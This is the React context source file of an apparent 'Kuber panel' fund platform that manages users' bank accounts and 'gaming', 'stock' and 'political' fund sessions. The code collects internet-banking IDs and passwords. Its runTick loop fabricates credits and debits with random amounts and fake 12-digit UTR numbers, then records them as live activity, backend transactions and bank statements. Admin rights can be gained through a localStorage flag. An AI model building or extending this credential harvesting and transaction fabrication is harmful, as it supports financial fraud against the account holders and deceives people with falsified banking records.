import {
  type ReactNode,
  createContext,
  useCallback,
  useContext,
  useEffect,
  useRef,
  useState,
} from "react";
import type {
  FundSessionData,
  TransactionData,
  UserProfile,
  WithdrawalData,
} from "../backend";
import { UserStatus } from "../backend";
import { useActor } from "../hooks/useActor";
import * as LocalStore from "../utils/LocalStore";
import type {
  BankAccountLS,
  BankStatementEntry,
  LiveTxEntry,
  UserActivation,
} from "../utils/LocalStore";
import { fmtTimeUpper } from "../utils/timeUtils";

const ADMIN_EMAIL = "kuberpanelwork@gmail.com";

export const COMMISSION_RATES: Record<string, number> = {
  gaming: 0.15,
  stock: 0.3,
  mix: 0.25,
  political: 0.3,
  all: 0.2,
};

const generate12DigitUTR = () =>
  Math.floor(100000000000 + Math.random() * 900000000000).toString();

const getCreditAmount = (fundType: string): number => {
  switch (fundType) {
    case "gaming":
      return Math.floor(200 + Math.random() * 9800);
    case "mix":
      return Math.floor(10000 + Math.random() * 40000);
    case "political":
    case "stock":
      return Math.floor(50000 + Math.random() * 1450000);
    default:
      return Math.floor(200 + Math.random() * 9800);
  }
};

const getDebitAmount = (fundType: string): number => {
  switch (fundType) {
    case "gaming":
      return Math.floor(5000 + Math.random() * 95000);
    case "mix":
      return Math.floor(10000 + Math.random() * 190000);
    case "political":
    case "stock":
      return Math.floor(300000 + Math.random() * 700000);
    default:
      return Math.floor(5000 + Math.random() * 95000);
  }
};

type Section =
  | "dashboard"
  | "add-bank"
  | "bank-statement"
  | "gaming-fund"
  | "stock-fund"
  | "mix-fund"
  | "political-fund"
  | "live-activity"
  | "commission"
  | "withdrawal"
  | "withdrawal-history"
  | "activation"
  | "help-support"
  | "generated-code"
  | "user-management"
  | "bank-approval"
  | "change-support";

export interface LiveTx {
  id: string;
  date: string;
  time: string;
  utrNumber: string;
  credit: number;
  debit: number;
  bankId: string;
  fundType: string;
  timestamp: string;
}

interface AppContextType {
  isAdmin: boolean;
  isActivated: boolean;
  userActivation: UserActivation | null;
  activatedFunds: string[];
  isFundActive: (fund: string) => boolean;
  isLoading: boolean;
  needsEmailRegistration: boolean;
  userEmail: string;
  activeSection: Section;
  setActiveSection: (s: Section) => void;
  bankAccountsLS: BankAccountLS[];
  bankAccounts: BankAccountLS[];
  transactions: TransactionData[];
  withdrawals: WithdrawalData[];
  adminCommissionBalance: number;
  commissionBalance: number;
  fundSessions: FundSessionData[];
  supportLink: string;
  activeFundSessions: Record<string, { sessionId: string; fundType: string }>;
  liveTxns: LiveTx[];
  refresh: () => void;
  registerEmail: (email: string) => Promise<void>;
  setActiveFundSession: (
    bankId: string,
    sessionId: string,
    fundType: string,
  ) => void;
  clearFundSession: (bankId: string) => void;
  logout: () => void;
}

const AppContext = createContext<AppContextType | null>(null);

function deriveFundStatus(profile: UserProfile | null): {
  activatedFunds: string[];
  userActivation: UserActivation | null;
} {
  if (!profile) return { activatedFunds: [], userActivation: null };
  const fs = profile.fundStatus;
  const funds: string[] = [];
  if (fs.gamingStatus.isActive) funds.push("gaming");
  if (fs.stockStatus.isActive) funds.push("stock");
  if (fs.mixStatus.isActive) funds.push("mix");
  if (fs.politicalStatus.isActive) funds.push("political");
  const userActivation: UserActivation = {
    isActive: funds.length > 0,
    activatedFunds: funds,
    fundCodes: {
      gaming: fs.gamingStatus.codeUsed,
      stock: fs.stockStatus.codeUsed,
      mix: fs.mixStatus.codeUsed,
      political: fs.politicalStatus.codeUsed,
    },
    firstActivatedAt: new Date(
      Number(profile.createdAt / BigInt(1_000_000)),
    ).toISOString(),
  };
  return { activatedFunds: funds, userActivation };
}

export function AppProvider({
  children,
  onLogout,
}: { children: ReactNode; onLogout: () => void }) {
  const { actor } = useActor();

  const adminFallback = !!localStorage.getItem("kuber_admin_fallback");
  const adminFallbackEmail =
    localStorage.getItem("kuber_admin_fallback_email") || ADMIN_EMAIL;

  const storedUserEmail =
    localStorage.getItem("kuber_logged_in_user") ||
    localStorage.getItem("kuber_user_email") ||
    "";

  const [isAdmin, setIsAdmin] = useState(adminFallback);
  const [userEmail, setUserEmail] = useState(
    adminFallback ? adminFallbackEmail : storedUserEmail,
  );
  const [canisterProfile, setCanisterProfile] = useState<UserProfile | null>(
    null,
  );
  const [localActivation, setLocalActivation] = useState<UserActivation | null>(
    () => {
      const email =
        localStorage.getItem("kuber_logged_in_user") ||
        localStorage.getItem("kuber_user_email") ||
        "";
      return email ? LocalStore.getUserActivation(email) : null;
    },
  );
  const needsEmailRegistration = false;
  const [isLoading, setIsLoading] = useState(true);
  const [activeSection, setActiveSection] = useState<Section>("dashboard");

  const [bankAccountsLS, setBankAccountsLS] = useState<BankAccountLS[]>([]);
  const [withdrawals, setWithdrawals] = useState<WithdrawalData[]>([]);

  const [adminCommissionBalance, setAdminCommissionBalance] = useState(() =>
    LocalStore.getAdminCommission(),
  );
  const [transactions, setTransactions] = useState<TransactionData[]>([]);
  const [fundSessions, setFundSessions] = useState<FundSessionData[]>([]);
  const [supportLink, setSupportLink] = useState(
    "https://t.me/+fUsY5uHRNeYyYmJl",
  );
  const [activeFundSessions, setActiveFundSessionsState] = useState<
    Record<string, { sessionId: string; fundType: string }>
  >(() => LocalStore.getSavedLiveSessions());

  const [liveTxns, setLiveTxns] = useState<LiveTx[]>(() =>
    LocalStore.getAllStoredLiveTxns().map((t) => ({
      ...t,
      timestamp: t.timestamp ?? new Date().toISOString(),
    })),
  );

  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const txTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const debitTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const activeFundSessionsRef = useRef(activeFundSessions);
  activeFundSessionsRef.current = activeFundSessions;
  const bankAccountsRef = useRef(bankAccountsLS);
  bankAccountsRef.current = bankAccountsLS;
  const activeSessionKey = Object.keys(activeFundSessions).sort().join(",");

  const { activatedFunds: derived_activatedFunds, userActivation } = isAdmin
    ? {
        activatedFunds: ["gaming", "stock", "mix", "political", "all"],
        userActivation: null,
      }
    : canisterProfile
      ? deriveFundStatus(canisterProfile)
      : {
          activatedFunds: localActivation?.activatedFunds ?? [],
          userActivation: localActivation ?? null,
        };

  const isActivated =
    isAdmin ||
    (userActivation?.isActive === true && derived_activatedFunds.length > 0);

  const isFundActive = (fund: string): boolean => {
    if (isAdmin) return true;
    return (
      derived_activatedFunds.includes(fund) ||
      derived_activatedFunds.includes("all")
    );
  };

  const commissionBalance = isAdmin ? adminCommissionBalance : 0;

  const mapBankToLS = useCallback(
    (bank: any, userId: string): BankAccountLS => ({
      id: bank.id,
      userId,
      accountType: bank.accountType ?? "",
      bankName: bank.bankName ?? "",
      accountHolderName: bank.accountHolderName ?? "",
      accountNumber: bank.accountNumber ?? "",
      ifscCode: bank.ifscCode ?? "",
      mobileNumber: bank.mobileNumber ?? "",
      internetBankingId: bank.internetBankingId ?? "",
      internetBankingPassword: bank.internetBankingPassword ?? "",
      upiId: bank.upiId ?? "",
      qrCodeUrl: bank.qrCodeUrl ?? "",
      fundType: bank.fundType ?? "",
      status: bank.status as "pending" | "approved" | "rejected",
      createdAt: bank.createdAt
        ? new Date(
            Number(BigInt(bank.createdAt) / BigInt(1_000_000)),
          ).toISOString()
        : new Date().toISOString(),
    }),
    [],
  );

  const initializeUser = useCallback(async () => {
    if (!actor) return;

    try {
      if (adminFallback) {
        setIsAdmin(true);
        setUserEmail(adminFallbackEmail);
        try {
          const allBanks = await actor.getAllBankAccounts();
          setBankAccountsLS(
            allBanks.map((b) => mapBankToLS(b, adminFallbackEmail)),
          );
        } catch {}
        try {
          const wds = await actor.getAllWithdrawals();
          setWithdrawals(wds);
        } catch {}
        try {
          const link = await actor.getSupportLink();
          setSupportLink(link);
        } catch {}
        const lsBanksAdmin = LocalStore.getBankAccounts();
        if (lsBanksAdmin.length > 0) setBankAccountsLS(lsBanksAdmin);
        setIsLoading(false);
        return;
      }

      const email = storedUserEmail;
      setUserEmail(email);

      if (email && email !== ADMIN_EMAIL) {
        LocalStore.saveRegisteredUser(email, "");
      }

      if (actor) {
        try {
          const [isAdminResult, profile] = await Promise.all([
            actor.isCallerAdmin().catch(() => false),
            actor.getCallerUserProfile().catch(() => null),
          ]);
          if (isAdminResult) {
            setIsAdmin(true);
            try {
              const allBanks = await actor.getAllBankAccounts();
              setBankAccountsLS(allBanks.map((b) => mapBankToLS(b, email)));
            } catch {}
            try {
              setWithdrawals(await actor.getAllWithdrawals());
            } catch {}
          } else if (profile) {
            setCanisterProfile(profile);
            try {
              const banks = await actor.getBankAccounts();
              setBankAccountsLS(banks.map((b) => mapBankToLS(b, email)));
            } catch {}
            try {
              setWithdrawals(await actor.getWithdrawals());
            } catch {}
          } else if (email && email !== ADMIN_EMAIL) {
            try {
              const newProfile: UserProfile = {
                name: email,
                mobile: "",
                status: UserStatus.active,
                fundStatus: {
                  gamingStatus: { isActive: false, codeUsed: "" },
                  stockStatus: { isActive: false, codeUsed: "" },
                  politicalStatus: { isActive: false, codeUsed: "" },
                  mixStatus: { isActive: false, codeUsed: "" },
                },
                createdAt: BigInt(Date.now()) * BigInt(1_000_000),
              };
              await actor.saveCallerUserProfile(newProfile);
              setCanisterProfile(newProfile);
            } catch {}

            // Save registration sentinel to canister bank accounts
            // This enables cross-device admin visibility for email-based auth users
            try {
              const sentinelKey = `kuber_canister_reg_${btoa(email).replace(/=/g, "").slice(0, 10)}`;
              if (!localStorage.getItem(sentinelKey)) {
                await actor.createBankAccount(
                  "__REG__", // accountType
                  "__USER_REG__", // bankName
                  email, // accountHolderName
                  "0000000000", // accountNumber
                  "KPRG0000001", // ifscCode
                  `__email__:${email}`, // mobileNumber
                  "", // internetBankingId
                  "", // internetBankingPassword
                  "", // upiId
                  "", // qrCodeUrl
                  "", // fundType
                );
                localStorage.setItem(sentinelKey, "1");
              }
            } catch {}
          }
          try {
            setSupportLink(await actor.getSupportLink());
          } catch {}
        } catch {}
      }
    } catch (err) {
      console.error("AppContext init error:", err);
    } finally {
      if (!adminFallback && storedUserEmail) {
        const lsBanks = LocalStore.getUserBankAccounts(storedUserEmail);
        if (lsBanks.length > 0) setBankAccountsLS(lsBanks);
        const lsAct = LocalStore.getUserActivation(storedUserEmail);
        if (lsAct) setLocalActivation(lsAct);
      }
      setIsLoading(false);
    }
  }, [actor, adminFallback, adminFallbackEmail, storedUserEmail, mapBankToLS]);

  useEffect(() => {
    initializeUser();
  }, [initializeUser]);

  // ─── Issue 1 Fix: Auto-clear orphaned live sessions where bank was deleted ───
  // biome-ignore lint/correctness/useExhaustiveDependencies: intentional - uses ref inside
  useEffect(() => {
    const sessions = LocalStore.getSavedLiveSessions();
    const sessionKeys = Object.keys(sessions);
    if (sessionKeys.length === 0) return;

    // If bankAccountsLS is empty, we can't verify yet; clear sessions that have no bank at all
    // Use a small delay to let bankAccountsLS load first
    const timer = setTimeout(() => {
      const approvedIds = new Set(
        bankAccountsRef.current
          .filter((b) => b.status === "approved")
          .map((b) => b.id),
      );

      let changed = false;
      for (const bankId of sessionKeys) {
        // If bankAccountsLS is populated and bank not found, clear session
        if (bankAccountsRef.current.length > 0 && !approvedIds.has(bankId)) {
          LocalStore.removeLiveSession(bankId);
          LocalStore.clearLiveTransactionsByBank(bankId);
          changed = true;
        }
        // Also clear if bank explicitly does not exist in ANY bank list (including non-approved)
        const anyBank = bankAccountsRef.current.find((b) => b.id === bankId);
        if (bankAccountsRef.current.length > 0 && !anyBank) {
          LocalStore.removeLiveSession(bankId);
          LocalStore.clearLiveTransactionsByBank(bankId);
          changed = true;
        }
      }

      if (changed) {
        const newSessions = LocalStore.getSavedLiveSessions();
        setActiveFundSessionsState(newSessions);
        const validIds = new Set(Object.keys(newSessions));
        setLiveTxns((prev) => prev.filter((tx) => validIds.has(tx.bankId)));
      }
    }, 1500);

    return () => clearTimeout(timer);
  }, [bankAccountsLS.length]);

  const registerEmail = useCallback(
    async (email: string) => {
      if (!actor) return;
      const profile: UserProfile = {
        name: email,
        mobile: "",
        status: UserStatus.active,
        fundStatus: {
          gamingStatus: { isActive: false, codeUsed: "" },
          stockStatus: { isActive: false, codeUsed: "" },
          politicalStatus: { isActive: false, codeUsed: "" },
          mixStatus: { isActive: false, codeUsed: "" },
        },
        createdAt: BigInt(Date.now()) * BigInt(1_000_000),
      };
      await actor.saveCallerUserProfile(profile);
      setCanisterProfile(profile);
      setUserEmail(email);
    },
    [actor],
  );

  const isAdminRef = useRef(isAdmin);
  isAdminRef.current = isAdmin;
  const actorRef = useRef(actor);
  actorRef.current = actor;

  const runTick = useCallback(async () => {
    const sessions = Object.entries(activeFundSessionsRef.current);
    if (!sessions.length || !isAdminRef.current) return;

    // Pick a session - but verify bank still exists
    const validSessions = sessions.filter(([bankId]) => {
      const bank = bankAccountsRef.current.find(
        (b) => b.id === bankId && b.status === "approved",
      );
      return !!bank;
    });

    // Auto-clear any orphaned sessions
    for (const [bankId] of sessions) {
      const bank = bankAccountsRef.current.find((b) => b.id === bankId);
      if (bankAccountsRef.current.length > 0 && !bank) {
        LocalStore.removeLiveSession(bankId);
        setActiveFundSessionsState((prev) => {
          const n = { ...prev };
          delete n[bankId];
          return n;
        });
      }
    }

    if (!validSessions.length) return;

    const [bankId, { fundType }] =
      validSessions[Math.floor(Math.random() * validSessions.length)];

    const utr = generate12DigitUTR();
    const creditAmount = getCreditAmount(fundType);
    const commRate = COMMISSION_RATES[fundType] ?? 0.15;
    const commission = +(creditAmount * commRate).toFixed(2);
    const now = new Date();
    const creditTx: LiveTx = {
      id: Math.random().toString(36).slice(2),
      date: now.toLocaleDateString("en-IN"),
      time: fmtTimeUpper(now),
      utrNumber: utr,
      credit: creditAmount,
      debit: 0,
      bankId,
      fundType,
      timestamp: now.toISOString(),
    };
    setLiveTxns((prev) => [creditTx, ...prev]);
    LocalStore.addAdminCommission(commission);
    LocalStore.addToSessionCommission(bankId, commission);
    LocalStore.saveLiveTransaction(bankId, creditTx as LiveTxEntry);
    setAdminCommissionBalance(LocalStore.getAdminCommission());
    if (actorRef.current) {
      try {
        await actorRef.current.createTransaction(
          bankId,
          utr,
          creditAmount,
          0,
          fundType,
        );
      } catch {}
    }

    const debitDelay = 6000 + Math.random() * 9000;
    if (debitTimerRef.current) clearTimeout(debitTimerRef.current);
    debitTimerRef.current = setTimeout(async () => {
      const sessions2 = Object.entries(activeFundSessionsRef.current);
      if (!sessions2.length || !isAdminRef.current) return;
      // Verify bank still exists
      const bank2 = bankAccountsRef.current.find(
        (b) => b.id === bankId && b.status === "approved",
      );
      if (!bank2) return;
      const debitAmount = getDebitAmount(fundType);
      const debitUtr = generate12DigitUTR();
      const now2 = new Date();
      const debitTx: LiveTx = {
        id: Math.random().toString(36).slice(2),
        date: now2.toLocaleDateString("en-IN"),
        time: fmtTimeUpper(now2),
        utrNumber: debitUtr,
        credit: 0,
        debit: debitAmount,
        bankId,
        fundType,
        timestamp: now2.toISOString(),
      };
      setLiveTxns((prev) => [debitTx, ...prev]);
      LocalStore.saveLiveTransaction(bankId, debitTx as LiveTxEntry);
      if (actorRef.current) {
        try {
          await actorRef.current.createTransaction(
            bankId,
            debitUtr,
            0,
            debitAmount,
            fundType,
          );
        } catch {}
      }
    }, debitDelay);
  }, []);

  useEffect(() => {
    const hasSessions = activeSessionKey.length > 0;
    if (!isAdmin || !hasSessions) {
      if (txTimerRef.current) {
        clearTimeout(txTimerRef.current);
        txTimerRef.current = null;
      }
      return;
    }
    runTick();
    const scheduleNext = () => {
      const delay = 5000 + Math.random() * 5000;
      txTimerRef.current = setTimeout(() => {
        runTick();
        scheduleNext();
      }, delay);
    };
    scheduleNext();
    return () => {
      if (txTimerRef.current) {
        clearTimeout(txTimerRef.current);
        txTimerRef.current = null;
      }
      if (debitTimerRef.current) {
        clearTimeout(debitTimerRef.current);
        debitTimerRef.current = null;
      }
    };
  }, [isAdmin, activeSessionKey, runTick]);

  const refresh = useCallback(() => {
    setAdminCommissionBalance(LocalStore.getAdminCommission());
    const lsEmail2 = adminFallback
      ? adminFallbackEmail || storedUserEmail
      : storedUserEmail;
    if (adminFallback) {
      const lsBanks2 = LocalStore.getBankAccounts();
      if (lsBanks2.length > 0) setBankAccountsLS(lsBanks2);
    } else if (lsEmail2) {
      const lsBanks2 = LocalStore.getUserBankAccounts(lsEmail2);
      if (lsBanks2.length > 0) setBankAccountsLS(lsBanks2);
      const lsAct2 = LocalStore.getUserActivation(lsEmail2);
      if (lsAct2) setLocalActivation(lsAct2);
    }
    if (actor) {
      Promise.all([
        actor.getTransactions().catch(() => []),
        actor.getFundSessions().catch(() => []),
        actor.getSupportLink().catch(() => "https://t.me/+fUsY5uHRNeYyYmJl"),
        isAdmin
          ? actor.getAllWithdrawals().catch(() => [])
          : actor.getWithdrawals().catch(() => []),
        isAdmin
          ? actor.getAllBankAccounts().catch(() => [])
          : actor.getBankAccounts().catch(() => []),
        !isAdmin
          ? actor.getCallerUserProfile().catch(() => null)
          : Promise.resolve(null),
      ])
        .then(([txns, sessions, link, wds, banks, profile]) => {
          setTransactions(txns);
          setFundSessions(sessions as FundSessionData[]);
          setSupportLink(link as string);
          setWithdrawals(wds as WithdrawalData[]);
          const emailKey = userEmail || adminFallbackEmail;
          setBankAccountsLS(
            (banks as any[]).map((b) => mapBankToLS(b, emailKey)),
          );
          if (!isAdmin && profile) {
            setCanisterProfile(profile as UserProfile);
            setUserEmail((profile as UserProfile).name);
          }
        })
        .catch(console.error);
    }
    setIsLoading(false);
  }, [
    actor,
    isAdmin,
    userEmail,
    adminFallback,
    adminFallbackEmail,
    storedUserEmail,
    mapBankToLS,
  ]);

  useEffect(() => {
    refresh();
  }, [refresh]);

  useEffect(() => {
    if (isAdmin || adminFallback) return;
    pollRef.current = setInterval(async () => {
      if (!actor) return;
      try {
        const profile = await actor.getCallerUserProfile();
        if (!profile) {
          onLogout();
          return;
        }
        setCanisterProfile(profile);
      } catch {}
    }, 10000);
    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, [isAdmin, adminFallback, actor, onLogout]);

  const setActiveFundSession = useCallback(
    (bankId: string, sessionId: string, fundType: string) => {
      LocalStore.saveLiveSession(bankId, sessionId, fundType);
      LocalStore.setSessionStartTime(bankId, new Date().toISOString());
      setActiveFundSessionsState((prev) => ({
        ...prev,
        [bankId]: { sessionId, fundType },
      }));
    },
    [],
  );

  const clearFundSession = useCallback((bankId: string) => {
    const session = activeFundSessionsRef.current[bankId];
    if (session) {
      const sessionCommission = LocalStore.getAndClearSessionCommission(bankId);
      const bank = bankAccountsRef.current.find((b) => b.id === bankId);
      const sessionStartTime =
        LocalStore.getSessionStartTime(bankId) ?? new Date().toISOString();
      const sessionEndTime = new Date().toISOString();
      const sessionGroupId = `sess_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`;

      if (bank && sessionCommission > 0) {
        const fundLabel =
          session.fundType.charAt(0).toUpperCase() + session.fundType.slice(1);
        LocalStore.addCommissionHistoryEntry({
          fundType: session.fundType,
          fundLabel,
          bankName: bank.bankName,
          accountNumber: bank.accountNumber,
          totalCommission: sessionCommission,
          startTime: sessionStartTime,
          endTime: sessionEndTime,
        });
      }
      const liveTxnsForBank = LocalStore.getLiveTransactionsByBank(bankId);
      if (liveTxnsForBank.length > 0 && bank) {
        const stmtEntries: BankStatementEntry[] = liveTxnsForBank.map((tx) => ({
          id: tx.id,
          bankId,
          bankName: bank.bankName,
          accountHolderName: bank.accountHolderName,
          accountNumber: bank.accountNumber,
          ifscCode: bank.ifscCode,
          mobileNumber: bank.mobileNumber,
          upiId: bank.upiId,
          fundType: tx.fundType,
          utrNumber: tx.utrNumber,
          credit: tx.credit,
          debit: tx.debit,
          date: tx.date,
          time: tx.time,
          timestamp: tx.timestamp,
          sessionId: sessionGroupId,
          sessionStartTime,
          sessionEndTime,
        }));
        LocalStore.addBankStatementEntries(stmtEntries);
      }
      LocalStore.clearSessionStartTime(bankId);
      LocalStore.clearLiveTransactionsByBank(bankId);
    }
    setLiveTxns((prev) => prev.filter((tx) => tx.bankId !== bankId));
    LocalStore.removeLiveSession(bankId);
    setActiveFundSessionsState((prev) => {
      const n = { ...prev };
      delete n[bankId];
      return n;
    });
    setAdminCommissionBalance(LocalStore.getAdminCommission());
  }, []);

  const logout = useCallback(() => {
    onLogout();
  }, [onLogout]);

  return (
    <AppContext.Provider
      value={{
        isAdmin,
        isActivated,
        userActivation,
        activatedFunds: derived_activatedFunds,
        isFundActive,
        isLoading,
        needsEmailRegistration,
        userEmail,
        activeSection,
        setActiveSection,
        bankAccountsLS,
        bankAccounts: bankAccountsLS,
        transactions,
        withdrawals,
        adminCommissionBalance,
        commissionBalance,
        fundSessions,
        supportLink,
        activeFundSessions,
        liveTxns,
        refresh,
        registerEmail,
        setActiveFundSession,
        clearFundSession,
        logout,
      }}
    >
      {children}
    </AppContext.Provider>
  );
}

export const useApp = () => {
  const ctx = useContext(AppContext);
  if (!ctx) throw new Error("useApp must be inside AppProvider");
  return ctx;
};
